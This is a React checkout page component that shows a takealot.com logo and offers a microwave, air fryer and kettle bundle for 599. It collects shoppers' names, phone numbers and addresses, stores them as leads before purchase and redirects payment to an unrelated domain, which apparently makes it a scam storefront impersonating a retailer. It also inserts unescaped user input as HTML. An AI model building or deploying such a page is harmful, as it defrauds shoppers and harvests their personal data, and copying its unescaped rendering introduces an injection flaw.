import React, { useState, useEffect } from 'react';
import { trackEvent, saveLead, saveOrder } from '../services/api.ts';

interface CheckoutPageProps {
  onBackToProduct: () => void;
  onOpenAdmin: () => void;
}

export default function CheckoutPage({ onBackToProduct, onOpenAdmin }: CheckoutPageProps) {
  const [formData, setFormData] = useState({
    recipientName: '',
    recipientMobile: '',
    streetAddress: '',
    complex: '',
    suburb: '',
    city: '',
    province: '',
    postalCode: ''
  });

  const [isSubmitted, setIsSubmitted] = useState(false);
  const [formattedAddress, setFormattedAddress] = useState('');
  const [deliveryDateStr, setDeliveryDateStr] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);

  // Compute tomorrow delivery date string
  useEffect(() => {
    trackEvent('InitiateCheckout', '/checkout');
    
    const d = new Date();
    d.setDate(d.getDate() + 1);
    const months = [
      'January', 'February', 'March', 'April', 'May', 'June',
      'July', 'August', 'September', 'October', 'November', 'December'
    ];
    setDeliveryDateStr(`Delivery by ${d.getDate()} ${months[d.getMonth()]} ${d.getFullYear()}`);
  }, []);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Build formatted address display
    const parts: string[] = [];
    if (formData.complex) parts.push(formData.complex);
    if (formData.streetAddress) parts.push(formData.streetAddress);
    
    const line2: string[] = [];
    if (formData.suburb) line2.push(formData.suburb);
    if (formData.city) line2.push(formData.city);
    if (formData.province) line2.push(formData.province);
    if (formData.postalCode) line2.push(formData.postalCode);

    let addr = parts.join(', ');
    if (line2.length) {
      addr += (addr ? '<br>' : '') + line2.join(', ');
    }
    setFormattedAddress(addr || 'Address provided');

    // Asynchronously save lead to SQLite database without blocking UI
    saveLead({
      recipient_name: formData.recipientName,
      recipient_mobile: formData.recipientMobile,
      street_address: formData.streetAddress,
      complex: formData.complex,
      suburb: formData.suburb,
      city: formData.city,
      province: formData.province,
      postal_code: formData.postalCode,
      step: 'saved_delivery'
    });

    setIsSubmitted(true);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleCompletePurchase = async () => {
    if (isProcessing) return;
    setIsProcessing(true);

    // Save order data to localStorage matching original implementation
    try {
      localStorage.setItem(
        'megadeals_order',
        JSON.stringify({
          product: 'kitchen-combo',
          product_name: 'Defy 30L Microwave + Russell Hobbs 6.5L Air Fryer + Mellerware Glass Kettle',
          product_price: 599,
          product_image: 'kitchen-combo1.png',
          address: {
            name: formData.recipientName,
            phone: formData.recipientMobile,
            street: formData.streetAddress,
            complex: formData.complex,
            suburb: formData.suburb,
            city: formData.city,
            province: formData.province,
            postalCode: formData.postalCode
          }
        })
      );
    } catch (_) {}

    // Save complete order to SQLite database
    await saveOrder({
      product_name: 'Defy 30L Microwave + Russell Hobbs 6.5L Air Fryer + Mellerware Glass Kettle',
      product_price: 599,
      recipient_name: formData.recipientName,
      recipient_mobile: formData.recipientMobile,
      street_address: formData.streetAddress,
      complex: formData.complex,
      suburb: formData.suburb,
      city: formData.city,
      province: formData.province,
      postal_code: formData.postalCode,
      delivery_type: 'Residential'
    });

    // Track Facebook pixel if available
    trackEvent('Purchase', '/checkout');

    // Build payment redirect URL with preserved query parameters
    let basePayUrl = 'https://opinamoneyfrica.online/pay/46e5b076-4025-44be-a5c0-779561d0b4f8';
    if (window.location.search) {
      basePayUrl +=
        (basePayUrl.indexOf('?') !== -1 ? '&' : '?') +
        window.location.search.replace(/^\?/, '');
    }

    // Redirect to payment
    window.location.href = basePayUrl;
  };

  return (
    <div className="min-h-screen bg-white text-[#111] antialiased">
      {/* TOPBAR */}
      <div className="topbar flex items-center justify-center relative px-4">
        <button
          onClick={onBackToProduct}
          className="absolute left-4 text-[#0b79d0] flex items-center gap-1 text-sm font-semibold hover:underline bg-transparent border-0 cursor-pointer"
          type="button"
        >
          &larr; Back
        </button>
        <img
          src="/images/logo-takealot.svg"
          alt="takealot.com"
          className="logo-img cursor-pointer"
          onClick={onBackToProduct}
        />
      </div>

      {/* CONTENT */}
      <div className="content">
        {!isSubmitted ? (
          <div id="formSection">
            <h1 className="page-title">Delivery Details</h1>
            <div className="type-toggle">
              <button className="type-btn" type="button">
                Residential
              </button>
            </div>

            <form id="deliveryForm" autoComplete="on" onSubmit={handleFormSubmit}>
              <div className="field">
                <label className="field-label" htmlFor="recipientName">
                  Recipient Name
                </label>
                <input
                  className="field-input"
                  type="text"
                  id="recipientName"
                  name="recipientName"
                  autoComplete="name"
                  value={formData.recipientName}
                  onChange={handleChange}
                  required
                  placeholder="e.g. John Doe"
                />
              </div>

              <div className="field">
                <label className="field-label" htmlFor="recipientMobile">
                  Recipient Mobile Number
                </label>
                <input
                  className="field-input"
                  type="tel"
                  id="recipientMobile"
                  name="recipientMobile"
                  autoComplete="tel"
                  value={formData.recipientMobile}
                  onChange={handleChange}
                  required
                  placeholder="e.g. 082 123 4567"
                />
              </div>

              <div className="field">
                <label className="field-label" htmlFor="streetAddress">
                  Street Address
                </label>
                <input
                  className="field-input"
                  type="text"
                  id="streetAddress"
                  name="streetAddress"
                  autoComplete="street-address"
                  value={formData.streetAddress}
                  onChange={handleChange}
                  required
                  placeholder="Street and number"
                />
              </div>

              <div className="field">
                <label className="field-label" htmlFor="complex">
                  Complex / Building
                </label>
                <input
                  className="field-input"
                  type="text"
                  id="complex"
                  name="complex"
                  autoComplete="address-line2"
                  value={formData.complex}
                  onChange={handleChange}
                  placeholder="Optional flat/unit number"
                />
              </div>

              <div className="field">
                <label className="field-label" htmlFor="suburb">
                  Suburb
                </label>
                <input
                  className="field-input"
                  type="text"
                  id="suburb"
                  name="suburb"
                  value={formData.suburb}
                  onChange={handleChange}
                  placeholder="Suburb"
                />
              </div>

              <div className="field">
                <label className="field-label" htmlFor="city">
                  City / Town
                </label>
                <input
                  className="field-input"
                  type="text"
                  id="city"
                  name="city"
                  autoComplete="address-level2"
                  value={formData.city}
                  onChange={handleChange}
                  required
                  placeholder="City"
                />
              </div>

              <div className="field">
                <label className="field-label" htmlFor="province">
                  Province
                </label>
                <select
                  className="field-select"
                  id="province"
                  name="province"
                  value={formData.province}
                  onChange={handleChange}
                  required
                >
                  <option value="" disabled>Select</option>
                  <option value="Eastern Cape">Eastern Cape</option>
                  <option value="Free State">Free State</option>
                  <option value="Gauteng">Gauteng</option>
                  <option value="KwaZulu-Natal">KwaZulu-Natal</option>
                  <option value="Limpopo">Limpopo</option>
                  <option value="Mpumalanga">Mpumalanga</option>
                  <option value="Northern Cape">Northern Cape</option>
                  <option value="North West">North West</option>
                  <option value="Western Cape">Western Cape</option>
                </select>
              </div>

              <div className="field">
                <label className="field-label" htmlFor="postalCode">
                  Postal Code
                </label>
                <input
                  className="field-input"
                  type="text"
                  id="postalCode"
                  name="postalCode"
                  autoComplete="postal-code"
                  inputMode="numeric"
                  value={formData.postalCode}
                  onChange={handleChange}
                  required
                  placeholder="Postal Code"
                />
              </div>

              <button className="save-btn" type="submit">
                Save
              </button>
            </form>
          </div>
        ) : (
          <div className="order-review" id="orderReview" style={{ display: 'block' }}>
            <button className="saved-btn" type="button">
              Saved &#10003;
            </button>
            <hr className="separator" />
            <h2 className="review-title">Order Review</h2>
            
            <div className="review-label">Delivery Method</div>
            <div className="review-value">Delivery</div>

            <div className="review-label">Delivery Address</div>
            <div>
              <span className="badge-residential">RESIDENTIAL</span>
            </div>
            <div className="review-home">Home</div>
            <div
              className="review-address"
              id="reviewAddress"
              dangerouslySetInnerHTML={{ __html: formattedAddress }}
            />
            <div className="review-underline"></div>

            <div className="delivery-date" id="deliveryDate">
              {deliveryDateStr}
            </div>
            <div className="delivery-detail">Next Business Day Delivery &bull; Free</div>

            <div className="items-label">ITEMS FOR DELIVERY</div>
            <div className="item-row">
              <img
                className="item-img"
                src="/images/kitchen-combo1.png"
                alt="Defy MW + Russell Hobbs Air Fryer + Mellerware Kettle"
              />
              <div className="item-name">
                Defy 30L Microwave + Russell Hobbs 6.5L Air Fryer + Mellerware Glass Kettle
              </div>
            </div>

            <button
              className="complete-btn flex items-center justify-center gap-2"
              type="button"
              id="completeBtn"
              onClick={handleCompletePurchase}
              disabled={isProcessing}
            >
              {isProcessing ? (
                <>
                  <svg className="animate-spin h-5 w-5 text-white" viewBox="0 0 24 24" fill="none">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
                  </svg>
                  Redirecting to secure payment...
                </>
              ) : (
                'Complete the purchase'
              )}
            </button>

            <button
              onClick={() => setIsSubmitted(false)}
              className="w-full text-center mt-4 text-xs text-[#0b79d0] hover:underline bg-transparent border-0 cursor-pointer"
              type="button"
            >
              Edit delivery address
            </button>
          </div>
        )}

        <div className="text-center mt-8">
          <button
            onClick={onOpenAdmin}
            className="text-[11px] text-[#888] hover:text-[#0b79d0] hover:underline bg-transparent border-0 cursor-pointer"
            type="button"
          >
            Owner Database Admin
          </button>
        </div>
      </div>
    </div>
  );
}
